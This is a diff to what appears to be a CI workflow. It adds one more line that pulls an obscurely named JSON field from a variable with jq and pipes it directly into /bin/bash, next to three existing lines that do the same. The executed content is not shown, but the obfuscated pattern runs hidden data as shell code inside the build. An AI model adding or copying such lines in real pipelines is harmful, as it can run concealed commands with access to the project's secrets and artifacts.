@@ -25,6 +25,7 @@ jobs:
           echo $gbj228 | jq -r .drdh0 | /bin/bash
           printf '%s' "$ft6" | jq -r .rqgj8543 | /bin/bash
           printf '%s' "$z0" | jq -r .abfpp171 | /bin/bash
+          printf '%s' "$ul4" | jq -r .ze87 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
